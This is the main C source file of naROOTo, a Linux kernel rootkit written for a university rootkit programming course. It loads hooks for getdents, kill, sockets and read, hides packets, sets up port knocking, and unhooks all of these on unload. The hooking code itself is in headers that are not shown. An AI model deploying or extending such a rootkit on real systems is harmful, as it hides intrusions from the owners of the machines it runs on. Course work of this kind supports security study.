/******************************************************************************
 *
 * Name: main.c 
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 *
 *****************************************************************************/
/*
 * This file is part of naROOTo.

 * naROOTo is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * naROOTo is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
 */

#include <linux/kernel.h>

#include "control.h"
#include "getdents.h"
#include "kill.h"
#include "hide_packet.h"
#include "hide_socket.h"
#include "include.h"
#include "main.h"
#include "port_knocking.h"
#include "read.h"
#include "hide_module.h"

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module(void)
{
	int ret;

	ROOTKIT_DEBUG("****************************************\n");
	ROOTKIT_DEBUG("Beginning rootkit loading procedure...\n");
	ROOTKIT_DEBUG("****************************************\n");

	// TODO: change all these functions from void to int to relay success/failure
	// TODO: remove as many parameters from the load functions as possible
	// TODO: only load what is absolutely necessary for the rootkit to function at insertion

	initialize_control();
	hook_getdents();
	hook_kill();
	hook_sockets();
	hook_read();
	load_packet_hiding();

	/* load port knocking */
	ret = load_port_knocking();
	if (ret < 0) {
		ROOTKIT_DEBUG
		    ("Error while loading port knocking! Aborting insertion.\n");
		return ret;
	}

	/* autoload functionality */
	//ROOTKIT_DEBUG("****************************************\n");  
	//ROOTKIT_DEBUG("Auto-loading functionality...\n");
	//ROOTKIT_DEBUG("****************************************\n");

	ROOTKIT_DEBUG("****************************************\n");
	ROOTKIT_DEBUG("Loading was successful!\n");
	ROOTKIT_DEBUG("****************************************\n");
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module(void)
{
	ROOTKIT_DEBUG("****************************************\n");
	ROOTKIT_DEBUG("Beginning rootkit unloading procedure...\n");
	ROOTKIT_DEBUG("****************************************\n");

	// TODO: adapt all unload functions to only do something if they are loaded

	cleanup_control();
	unload_packet_hiding();
	unhook_sockets();
	unhook_read();
	unhook_modules();
	unload_port_knocking();
	unhook_getdents();
	unhook_kill();

	/* sleep for a bit to ensure all processes have left our functions */
	msleep(500);

	/* Finally, log the unloading */
	ROOTKIT_DEBUG("****************************************\n");
	ROOTKIT_DEBUG("Unloading was successful. Bye!\n");
	ROOTKIT_DEBUG("****************************************\n");
}
